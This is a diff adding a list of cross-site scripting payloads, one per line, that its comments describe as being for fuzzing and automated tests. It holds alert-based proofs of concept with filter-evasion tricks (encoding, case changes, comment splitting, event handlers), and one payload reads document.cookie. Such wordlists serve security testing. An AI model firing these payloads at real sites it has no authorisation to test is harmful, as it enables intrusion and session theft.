@@ -1,0 +1,29 @@
+# XSS payload 单行列表，可用于 fuzz / 自动化测试
+# 以 # 开头的行为注释
+
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+"><script>alert('XSS')</script>
+'><script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg/onload=alert('XSS')>
+<a href="javascript:alert('XSS')">click</a>
+<iframe src="javascript:alert('XSS')"></iframe>
+<input autofocus onfocus=alert(1)>
+<ScRiPt>alert(1)</ScRiPt>
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
+<svg onload=alert`1`>
+<scr<!---->ipt>alert(1)</scr<!---->ipt>
+[click](javascript:alert('XSS'))
+![](x onerror=alert(1))
+<body onload=alert(1)>
+<details open ontoggle=alert(1)>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<img src=x onerror=alert(String.fromCharCode(88,83,83))>
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+%3Cscript%3Ealert(1)%3C/script%3E
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<form><button formaction="javascript:alert(1)">x</button></form>
